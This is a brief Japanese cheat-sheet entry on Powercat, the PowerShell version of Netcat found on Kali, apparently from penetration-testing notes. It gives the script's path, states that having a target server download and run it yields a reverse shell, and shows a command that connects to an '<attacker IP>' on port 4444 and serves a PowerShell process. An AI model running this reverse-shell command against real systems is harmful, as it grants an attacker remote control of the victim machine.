# Powercat
Kaliにデフォで入っているNetcatのPowershell版。  
デフォルトのパスは以下。  
/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1

上記のpowercat.ps1をターゲットサーバにダウンロード・実行させるとリバースシェルを確立できる。

## 使い方
windows上で実行するのが基本。  
例：
```
powercat -c <attacker IP> -p 4444 -e powershell
```

-c => 接続先のIPアドレスを指定  
-e => どのプロセスを使って実行するかを指定 (例： -e powershell)